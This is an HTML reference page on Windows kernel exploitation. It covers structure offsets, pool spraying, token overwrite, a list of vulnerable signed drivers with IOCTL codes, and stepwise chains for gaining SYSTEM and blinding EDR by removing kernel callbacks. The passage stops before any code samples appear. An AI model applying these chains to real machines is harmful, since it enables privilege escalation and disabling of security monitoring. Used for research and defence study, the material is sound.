<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kernel Exploitation (Windows) Reference</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}.off{color:#ef4444;font-weight:600;font-size:.82em}.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#34d399,#60a5fa,#a855f7);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.hd .sub{font-size:.62em;color:#374151}.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}.sb.on{background:#111318}.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}.ct{padding:10px 14px;overflow-x:auto}.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}.bx-b{padding:6px 10px}.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}.fd .tp{color:#6b7280;font-size:.82em}.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}.tg-s{padding:0 5px;font-size:.68em}.nt{margin:6px 0;padding:7px 10px;border-radius:6px}.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}.ct2:hover{background:#111827}.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}.cv.op{transform:rotate(90deg)}.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}.cb .cm{color:#4b5563}.cb .pp{color:#f59e0b}.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}.ti.op{border-color:#f9731640;background:#f9731608}.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}.ti.op .tn{color:#fdba74}.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}.dt{width:6px;height:6px;border-radius:2px;display:inline-block}.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
</style>
</head>
<body>
<div id="app"></div>
<script>
var $=function(s){return document.querySelector(s)};
var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
var SE=[
{id:"arc",l:"A. Kernel Architecture",i:"\u{1F9EC}",c:"#34d399"},
{id:"drv",l:"B. Driver Attack Surface",i:"\u{1F50C}",c:"#60a5fa"},
{id:"pol",l:"C. Pool Exploitation",i:"\u{1F4A7}",c:"#a78bfa"},
{id:"tkn",l:"D. Token Abuse",i:"\u{1F3AB}",c:"#f87171"},
{id:"cbk",l:"E. Callbacks & EDR",i:"\u{1F514}",c:"#fbbf24"},
{id:"byo",l:"F. BYOVD Deep Dive",i:"\u{1F4A5}",c:"#f59e0b"},
{id:"mit",l:"G. Mitigations",i:"\u{1F6E1}\uFE0F",c:"#e879f9"},
{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
{id:"cha",l:"I. Exploit Chains",i:"\u{1F525}",c:"#fb923c"}
];
var S={s:'arc',t:'flow'};
function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
function fARC(){
var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">WINDOWS KERNEL ARCHITECTURE</div>';
h+='<div class="grd">';
h+=CRD("\u{1F9EC}","EPROCESS Structure","#34d399",F("+0x000","Pcb (KPROCESS embedded)","")+F("+0x2e0","UniqueProcessId","")+F("+0x2e8","ActiveProcessLinks (doubly-linked list)","")+F("+0x360","Token (EX_FAST_REF)","")+F("+0x3e8","ImageFileName[15]","")+F("+0x4b8","Protection (PS_PROTECTION)","")+F("","Offsets vary by build \u2014 always verify with symbols",""));
h+=CRD("\u{1F527}","ETHREAD / KTHREAD","#34d399",F("+0x000","Tcb (KTHREAD embedded)","")+F("+0x220","Cid (CLIENT_ID: PID + TID)","")+F("+0x098","PreviousMode (UserMode=1, KernelMode=0)","")+F("+0x0e0","TrapFrame (user context on syscall entry)","")+F("","PreviousMode controls access checks: kernel skips them",""));
h+=CRD("\u{1F4A7}","Pool Allocator","#34d399",F("","NonPagedPool: always in physical memory (drivers, IRQLs)","")+F("","PagedPool: can be paged out (most kernel objects)","")+F("","Segment Heap: Win10 19H1+ default kernel allocator","")+F("","Low Fragmentation Heap (LFH) in user; Segment in kernel","")+F("","Pool tags: 4-byte identifier per allocation",""));
h+=CRD("\u{1F510}","Object Manager","#34d399",F("","Every kernel object has OBJECT_HEADER","")+F("","-0x30: OBJECT_HEADER (TypeIndex, HandleCount, etc.)","")+F("","TypeIndex: encodes object type (Process=7, Thread=8, etc.)","")+F("","Type index cookie XOR obfuscation (Win10+)","")+F("","\\ObjectTypes\\: Process, Thread, File, Token, etc.",""));
h+=CRD("\u{1F4BB}","PTE / Virtual Memory","#34d399",F("","4-level paging: PML4 \u2192 PDPT \u2192 PD \u2192 PT \u2192 Physical","")+F("","PTE bits: Present, R/W, User/Supervisor, NX","")+F("","Kernel pages: Supervisor bit set (ring 0 only)","")+F("","SMEP: CPU prevents executing user-mode pages from ring 0","")+F("","SMAP: CPU prevents accessing user-mode data from ring 0",""));
h+=CRD("\u2699\uFE0F","HAL & System Calls","#34d399",F("","HAL: Hardware Abstraction Layer (hal.dll)","")+F("","SSDT: System Service Descriptor Table (syscall dispatch)","")+F("","KiSystemCall64: syscall entry point","")+F("","MSR 0xC0000082 (LSTAR): points to KiSystemCall64","")+F("","PatchGuard monitors SSDT for modifications",""));
h+='</div>';return h;
}
function fDRV(){
var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">DRIVER ATTACK SURFACE</div>';
h+='<div class="fr">';
h+=B("Usermode Client","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","CreateFile(\\\\\\\\.\\\\DeviceName)","")+F("","DeviceIoControl(IOCTL_CODE, ...)","")+F("","Input/Output buffer from usermode","")+'</div>',220);
h+=A("IRP");
h+=B("Driver Dispatch","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","IRP_MJ_DEVICE_CONTROL handler","")+F("","IOCTL code parsed","")+F("","Input buffer + size validated (or not)","")+F("","Action performed in kernel context","")+'</div>',260);
h+=A("result");
h+=B("Kernel Impact","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Arbitrary R/W if poor validation","")+F("","Code execution in ring 0","")+F("","Pool corruption if buffer overflow","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F50C}","IOCTL Dispatch Vulnerabilities","#60a5fa",F("","METHOD_BUFFERED: kernel copies in/out (safest)","")+F("","METHOD_IN_DIRECT / METHOD_OUT_DIRECT: MDL-based","")+F("","METHOD_NEITHER: raw user pointers (most dangerous)","")+F("","Missing size validation \u2192 buffer overflow","")+F("","Missing pointer validation \u2192 arbitrary R/W",""));
h+=CRD("\u{1F50D}","Attack Surface Mapping","#60a5fa",F("","IDA/Ghidra: find DriverEntry \u2192 IRP_MJ_DEVICE_CONTROL","")+F("","Enumerate IOCTL codes (CTL_CODE macro)","")+F("","Trace input buffer handling per IOCTL","")+F("","Check: ProbeForRead/ProbeForWrite calls (validation)","")+F("","Missing probes on METHOD_NEITHER = vulnerability",""));
h+=CRD("\u{1F4CB}","Vulnerable Driver Patterns","#60a5fa",F("","Pattern 1: arbitrary physical memory R/W via IOCTL","")+F("","Pattern 2: MSR read/write (control system registers)","")+F("","Pattern 3: arbitrary virtual memory R/W","")+F("","Pattern 4: arbitrary code execution callback","")+F("","Pattern 5: pool overflow from unchecked input size",""));
h+=CRD("\u{1F527}","Named Device Objects","#60a5fa",F("","\\\\.\\PhysicalMemory (Section object, restricted)","")+F("","Custom device: IoCreateDevice + IoCreateSymbolicLink","")+F("","DACL on device object controls access","")+F("","Many vuln drivers: NULL DACL (Everyone: Full Control)","")+F("","Enumerate: WinObj \u2192 Device namespace",""));
h+='</div>';return h;
}
function fPOL(){
var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">POOL EXPLOITATION</div>';
h+='<div class="grd">';
h+=CRD("\u{1F4A7}","Pool Overflow Basics","#a78bfa",F("","Overflow pool allocation into adjacent object","")+F("","Corrupt: OBJECT_HEADER, TypeIndex, or object data","")+F("","Adjacent object becomes controlled","")+F("","Need predictable pool layout (pool feng shui)","")+F("","Trigger: IOCTL with oversized input buffer",""));
h+=CRD("\u{1F3AF}","Pool Feng Shui / Spray","#a78bfa",F("","Goal: control objects adjacent to vulnerable allocation","")+F("","Step 1: spray pool with identically-sized objects","")+F("","Step 2: create holes by freeing specific objects","")+F("","Step 3: trigger vulnerable allocation (fills hole)","")+F("","Step 4: overflow into adjacent controlled object","")+F("","Common spray objects: Named Pipes, Events, IoCompletionPorts",""));
h+=CRD("\u{1F527}","Segment Heap (Win10 19H1+)","#a78bfa",F("","Replaced legacy pool allocator","")+F("","Variable Size (VS): small allocs (<512 bytes)","")+F("","Low Fragmentation (LFH): fixed-size buckets","")+F("","Large: direct virtual alloc","")+F("","VS metadata corruption: different exploitation than legacy","")+F("","LFH randomization complicates spray reliability",""));
h+=CRD("\u{1F510}","Pool Header / Metadata","#a78bfa",F("","Legacy: POOL_HEADER (0x10 bytes) before each alloc","")+F("","Fields: PreviousSize, PoolIndex, BlockSize, PoolType, PoolTag","")+F("","Segment Heap: different metadata layout","")+F("","Corrupting metadata \u2192 arbitrary free / write primitive","")+F("","Pool cookies validate header integrity (bypass needed)",""));
h+=CRD("\u{1F4CA}","Use-After-Free (UAF)","#a78bfa",F("","Object freed but pointer still referenced","")+F("","Reallocate freed slot with controlled data","")+F("","Dangling pointer now points to attacker data","")+F("","Spray same-size objects to reclaim slot","")+F("","Virtual function table overwrite \u2192 code execution",""));
h+=CRD("\u{1F4BB}","Type Confusion","#a78bfa",F("","Object treated as wrong type","")+F("","Fields at same offsets interpreted differently","")+F("","Example: TypeIndex corruption in OBJECT_HEADER","")+F("","Causes kernel to call wrong type's methods","")+F("","Can redirect to attacker-controlled function pointers",""));
h+='</div>';return h;
}
function fTKN(){
var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">KERNEL TOKEN ABUSE</div>';
h+='<div class="fr">';
h+=B("Current Process","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","EPROCESS at known address","")+F("","Token field at +0x360 (EX_FAST_REF)","")+F("","Current: Medium IL / standard user","")+'</div>',220);
h+=A("overwrite");
h+=B("SYSTEM EPROCESS","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","PID 4 (System process)","")+F("","Walk ActiveProcessLinks to find","")+F("","Copy Token value","")+'</div>',200);
h+=A("result");
h+=B("SYSTEM Access","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Current process now has SYSTEM token","")+F("","All access checks pass","")+F("","No new process needed","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
h+=CRD("\u{1F3AB}","Token Overwrite Technique","#f87171",F("","EPROCESS.Token is EX_FAST_REF (ptr | ref_count)","")+F("","Mask low 4 bits: Token & ~0xF = actual pointer","")+F("","Copy SYSTEM token ptr to current process","")+F("","PsInitialSystemProcess: global ptr to System EPROCESS","")+F("","Or: walk ActiveProcessLinks until PID == 4",""));
h+=CRD("\u{1F512}","Privilege Bitmap Modification","#f87171",F("","TOKEN.Privileges: SEP_TOKEN_PRIVILEGES struct","")+F("+0x48","Present: bitfield of assigned privileges","")+F("+0x50","Enabled: bitfield of active privileges","")+F("","Set all bits to 0xFFFFFFFFFFFFFFFF","")+F("","Grants every privilege including SeDebugPrivilege",""));
h+=CRD("\u{1F50D}","Finding EPROCESS","#f87171",F("","Method 1: PsInitialSystemProcess (exported symbol)","")+F("","Method 2: PsGetCurrentProcess() \u2192 walk ActiveProcessLinks","")+F("","Method 3: PsLookupProcessByProcessId(PID)","")+F("","Method 4: Walk ETHREAD.Tcb.Process chain","")+F("","All require arbitrary kernel read primitive",""));
h+=CRD("\u{1F527}","Integrity Level Manipulation","#f87171",F("","TOKEN.IntegrityLevelIndex in _SEP_TOKEN_PRIVILEGES","")+F("","Or: TOKEN.MandatoryPolicy","")+F("","Set to SystemIntegrity (0x4000) for SYSTEM level","")+F("","Combined with token overwrite for full escalation",""));
h+='</div>';return h;
}
function fCBK(){
var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">KERNEL CALLBACKS & EDR BLINDING</div>';
h+='<div class="grd">';
h+=CRD("\u{1F514}","Process Notify Callbacks","#fbbf24",F("","PsSetCreateProcessNotifyRoutineEx","")+F("","Array: PspCreateProcessNotifyRoutine (up to 64)","")+F("","Each entry: EX_CALLBACK_ROUTINE_BLOCK","")+F("","Contains: Function pointer to EDR callback","")+F("","Zeroing entries \u2192 EDR blind to process creation",""));
h+=CRD("\u{1F504}","Thread Notify Callbacks","#fbbf24",F("","PsSetCreateThreadNotifyRoutine","")+F("","Array: PspCreateThreadNotifyRoutine","")+F("","Fires on every thread creation/termination","")+F("","EDR uses this to detect injection (remote threads)","")+F("","Same removal technique as process callbacks",""));
h+=CRD("\u{1F4E6}","Image Load Callbacks","#fbbf24",F("","PsSetLoadImageNotifyRoutine","")+F("","Array: PspLoadImageNotifyRoutine","")+F("","Fires on every DLL/EXE load","")+F("","EDR uses to detect: reflective loading, sideloading","")+F("","Removal prevents DLL load telemetry",""));
h+=CRD("\u{1F512}","Object Callbacks (ObRegisterCallbacks)","#fbbf24",F("","Pre/Post operation callbacks on handle operations","")+F("","EDR registers on: Process, Thread object types","")+F("","Pre-callback can strip handle access rights","")+F("","Blocks: OpenProcess with PROCESS_VM_WRITE","")+F("","Removal: walk CallbackListHead, unlink entries",""));
h+=CRD("\u{1F4CB}","Minifilter Callbacks","#fbbf24",F("","FltRegisterFilter: file system filter","")+F("","IRP_MJ_CREATE, IRP_MJ_WRITE pre/post callbacks","")+F("","FltObjects\u2192FilterLink chains all registered filters","")+F("","Zeroing PreOperation/PostOperation function pointers","")+F("","Or: FltUnregisterFilter if you have the filter handle",""));
h+=CRD("\u{1F50D}","Registry Callbacks","#fbbf24",F("","CmRegisterCallbackEx: registry operation monitoring","")+F("","CallbackListHead in CMHIVE structure","")+F("","Fires on: RegCreateKey, RegSetValue, RegDeleteKey","")+F("","EDR detects persistence via registry monitoring","")+F("","Less commonly removed (lower priority target)",""));
h+='</div>';
h+=N("REMOVAL STRATEGY","#fbbf24","<b>Priority order:</b> Process notify (highest impact) \u2192 Object callbacks (unblocks handle operations) \u2192 Minifilters (unblocks file drops) \u2192 Thread notify \u2192 Image load. Removing process notify alone blinds most EDR behavioral detection.");
return h;
}
function fBYO(){
var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">BYOVD DEEP DIVE</div>';
h+='<div class="fr">';
h+=B("Load Driver","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","sc create + sc start","")+F("","Or: NtLoadDriver","")+F("","Requires admin / SeLoadDriverPrivilege","")+'</div>',200);
h+=A("IOCTL");
h+=B("Arbitrary R/W","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","DeviceIoControl with read/write IOCTL","")+F("","Physical or virtual memory access","")+F("","Controlled by attacker input","")+'</div>',240);
h+=A("exploit");
h+=B("Kernel Primitive","#f59e0b",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","Token overwrite","")+F("","Callback removal","")+F("","Arbitrary code execution","")+'</div>',200);
h+='</div>';
h+='<div class="grd" style="margin-top:8px">';
var drivers=[
{n:"RTCore64.sys",v:"MSI Afterburner",d:"Physical memory R/W. IOCTLs 0x80002048/0x8000204C. Most used BYOVD driver.",c:"#f87171"},
{n:"dbutil_2_3.sys",v:"Dell BIOS Utility",d:"Physical memory R/W. CVE-2021-21551. Widely exploited by APTs.",c:"#60a5fa"},
{n:"Capcom.sys",v:"Capcom Anti-Cheat",d:"Disables SMEP, executes user-supplied function in ring 0. Direct code exec.",c:"#34d399"},
{n:"gdrv.sys",v:"GIGABYTE drivers",d:"Physical memory R/W. Multiple IOCTLs. Multiple CVEs.",c:"#a78bfa"},
{n:"AsIO2.sys",v:"ASUS utilities",d:"Physical memory, I/O port, MSR access. CVE-2021-28685.",c:"#fbbf24"},
{n:"HW.sys",v:"PassMark utilities",d:"Physical memory + MSR R/W. Commonly available, signed.",c:"#e879f9"},
{n:"ProcExp.sys",v:"Sysinternals ProcExp",d:"Kill protected processes. Process handle opening bypass. Signed by MS.",c:"#f59e0b"}
];
drivers.forEach(function(d){h+='<div style="border-radius:6px;border:1px solid '+d.c+'20;background:'+d.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+d.c+';font-size:.72em">'+d.n+'</span><span style="font-size:.58em;color:#6b7280">'+d.v+'</span></div><div style="font-size:.64em;color:#9ca3af;margin-top:1px">'+d.d+'</div></div>';});
h+='</div>';
h+=N("LOADING METHODS","#f59e0b","<b>sc create/start</b> (most common, needs admin). <b>NtLoadDriver</b> with registry key (SeLoadDriverPrivilege). <b>ExploitCapcom</b> disables SMEP for direct ring0 code exec. <b>ProcExp.sys</b> is Microsoft-signed and often overlooked by block lists.");
return h;
}
function fMIT(){
var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">KERNEL MITIGATIONS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F6E1}\uFE0F","SMEP / SMAP","#e879f9",F("","SMEP: Supervisor Mode Execution Prevention","")+F("","CPU refuses to execute user-mode pages from ring 0","")+F("","Blocks: classic ret2user (shellcode in usermode)","")+F("","SMAP: Supervisor Mode Access Prevention","")+F("","CPU refuses to read/write user-mode pages from ring 0","")+F("","Bypass: ROP in kernel or flip CR4.SMEP bit (needs write)",""));
h+=CRD("\u{1F510}","HVCI (Hypervisor Code Integrity)","#e879f9",F("","Hypervisor enforces W^X for kernel memory","")+F("","No RWX pages in kernel","")+F("","Cannot allocate executable kernel memory","")+F("","Blocks: shellcode in pool, custom drivers","")+F("","Bypass: data-only attacks (token overwrite, callback removal)","")+F("","Cannot load unsigned drivers when HVCI active",""));
h+=CRD("\u{1F512}","VBS (Virtualization-Based Security)","#e879f9",F("","Secure kernel runs alongside normal kernel","")+F("","Credential Guard: LSASS secrets in VTL1","")+F("","KDP (Kernel Data Protection): read-only kernel data","")+F("","HyperGuard: protects PatchGuard from tampering","")+F("","Cannot be disabled from within compromised OS",""));
h+=CRD("\u{1F4BB}","PatchGuard / KPP","#e879f9",F("","Kernel Patch Protection: monitors critical structures","")+F("","Checks: SSDT, IDT, GDT, MSRs, kernel code sections","")+F("","Periodic timer-based verification (random intervals)","")+F("","Triggers BSOD on detected modification","")+F("","Bypass: timing attack or HyperGuard if VBS off",""));
h+=CRD("\u{1F3AF}","kCFG (Kernel Control Flow Guard)","#e879f9",F("","Validates indirect call targets in kernel","")+F("","Bitmap of valid call targets","")+F("","Prevents hijacking function pointers to arbitrary code","")+F("","Bypass: call already-valid targets (data-only attacks)","")+F("","Or: overwrite bitmap (requires kernel write)",""));
h+=CRD("\u{1F4CA}","Kernel ASLR / KASLR","#e879f9",F("","Randomizes kernel base address at boot","")+F("","ntoskrnl.exe, hal.dll, drivers randomized","")+F("","Info leak needed to defeat KASLR","")+F("","NtQuerySystemInformation leaks some addresses","")+F("","Medium IL can query SystemModuleInformation (pre-RS3)",""));
h+='</div>';return h;
}
function fKIT(){
var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">KERNEL EXPLOITATION TOOLKIT</div>';
h+='<div class="grd" style="margin-bottom:10px">';
var tools=[
{n:"WinDbg (Kernel Debug)",d:"Local/remote kernel debugging. kd, !process, !token, !object, dt nt!_EPROCESS. Essential for offset discovery.",c:"#34d399"},
{n:"IDA Pro / Ghidra",d:"Driver reverse engineering. Find IOCTL handlers, trace input validation, identify vulnerable code paths.",c:"#60a5fa"},
{n:"OSR Driver Loader",d:"Load/unload drivers without sc.exe. GUI tool for kernel driver testing during development.",c:"#a78bfa"},
{n:"HyperDbg",d:"Hypervisor-level debugger. Invisible to PatchGuard. Hardware debugging without standard breakpoints.",c:"#f87171"},
{n:"loldrivers.io",d:"Catalog of vulnerable signed drivers. IOCTL codes, CVEs, exploitation techniques, and PoC references.",c:"#fbbf24"},
{n:"EDRSandblast",d:"Automated BYOVD EDR killer. Loads driver, removes callbacks, kills minifilters. Multiple driver support.",c:"#e879f9"},
{n:"kdmapper",d:"Map unsigned drivers into kernel. Uses Intel vulnerable driver to bypass DSE. Testing tool.",c:"#f59e0b"},
{n:"HEVD",d:"HackSys Extreme Vulnerable Driver. Training driver with: stack overflow, pool overflow, UAF, type confusion, etc.",c:"#f472b6"}
];
tools.forEach(function(t){h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="font-weight:700;color:'+t.c+';font-size:.72em">'+t.n+'</div><div style="font-size:.64em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';});
h+='</div>';
h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin:6px 0">WINDBG ESSENTIAL COMMANDS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F4BB}","Process & Token","#f472b6",F("","!process 0 0 \u2192 list all EPROCESS","")+F("","!process <addr> 1 \u2192 detailed process info","")+F("","!token <addr> \u2192 dump token privileges","")+F("","dt nt!_EPROCESS <addr> \u2192 structure fields","")+F("","dt nt!_TOKEN <addr> \u2192 token structure",""));
h+=CRD("\u{1F527}","Callbacks & Drivers","#f472b6",F("","!callback \u2192 list registered callbacks","")+F("","!drvobj <name> \u2192 driver object details","")+F("","!devobj <name> \u2192 device object + DACL","")+F("","lm \u2192 loaded modules with base addresses","")+F("","!fltkd.filters \u2192 list minifilters",""));
h+=CRD("\u{1F4A7}","Pool & Memory","#f472b6",F("","!pool <addr> \u2192 pool allocation info","")+F("","!poolused 2 \u2192 pool usage by tag","")+F("","!pte <addr> \u2192 page table entry info","")+F("","dp/dq <addr> \u2192 dump pointers","")+F("","s -d <range> <value> \u2192 memory search",""));
h+='</div>';return h;
}
function fCHA(){
var h='<div style="font-size:.72em;font-weight:800;color:#fb923c;letter-spacing:.06em;margin-bottom:6px">FULL EXPLOIT CHAINS</div>';
h+='<div class="grd">';
h+=CRD("\u{1F525}","Chain 1: BYOVD \u2192 Token Overwrite","#fb923c",F("1.","Load vulnerable signed driver (RTCore64.sys)","")+F("2.","Use physical memory read to find ntoskrnl base (defeat KASLR)","")+F("3.","Resolve PsInitialSystemProcess address from exports","")+F("4.","Read SYSTEM EPROCESS Token via physical memory read IOCTL","")+F("5.","Find current process EPROCESS (walk ActiveProcessLinks)","")+F("6.","Overwrite current Token with SYSTEM Token value","")+F("7.","Current process is now SYSTEM",""));
h+=CRD("\u{1F514}","Chain 2: BYOVD \u2192 EDR Callback Removal","#fb923c",F("1.","Load driver (dbutil_2_3.sys)","")+F("2.","Resolve PspCreateProcessNotifyRoutine array address","")+F("3.","Read callback array entries (up to 64)","")+F("4.","For each entry: read EX_CALLBACK_ROUTINE_BLOCK","")+F("5.","Identify EDR callbacks by module base range","")+F("6.","Zero the function pointer in each EDR entry","")+F("7.","Repeat for Thread, Image, Object callbacks + minifilters",""));
h+=CRD("\u{1F4A7}","Chain 3: Pool Overflow \u2192 Arbitrary R/W","#fb923c",F("1.","Spray pool with victim objects (known size, known layout)","")+F("2.","Create holes in spray pattern (free specific objects)","")+F("3.","Trigger vulnerable driver IOCTL with oversized buffer","")+F("4.","Overflow into adjacent object, corrupt metadata/vtable","")+F("5.","Trigger corrupted object: read/write primitive achieved","")+F("6.","Use R/W to perform token overwrite","")+F("7.","Data-only: bypasses SMEP, HVCI, kCFG",""));
h+=CRD("\u{1F527}","Chain 4: UAF \u2192 Type Confusion \u2192 Code Exec","#fb923c",F("1.","Trigger use-after-free in driver/kernel component","")+F("2.","Spray freed slot with controlled object (same size)","")+F("3.","Dangling pointer now references attacker data","")+F("4.","Object used as wrong type \u2192 type confusion","")+F("5.","Overwritten vtable entry \u2192 redirected function call","")+F("6.","If SMEP: ROP chain in kernel or data-only attack","")+F("7.","If no SMEP: direct shellcode execution (ret2user)",""));
h+=CRD("\u{1F4BB}","Chain 5: Info Leak \u2192 Kernel Exploit \u2192 Full","#fb923c",F("1.","NtQuerySystemInformation info leak (defeat KASLR)","")+F("2.","Calculate target structure offsets from kernel base","")+F("3.","Trigger kernel vulnerability (CVE, driver bug)","")+F("4.","Achieve arbitrary read primitive","")+F("5.","Walk EPROCESS list, find targets","")+F("6.","Achieve arbitrary write primitive","")+F("7.","Token overwrite + callback removal = SYSTEM + EDR blind",""));
h+='</div>';
h+=N("DATA-ONLY ATTACKS","#fb923c","Modern mitigations (SMEP, HVCI, kCFG) prevent code execution in kernel. <b>Data-only attacks</b> (token overwrite, callback zeroing, privilege bitmap modification) only modify data structures and bypass all code-integrity mitigations. This is the modern standard.");
return h;
}
function getCodes(s){
var C={};
C.arc=[
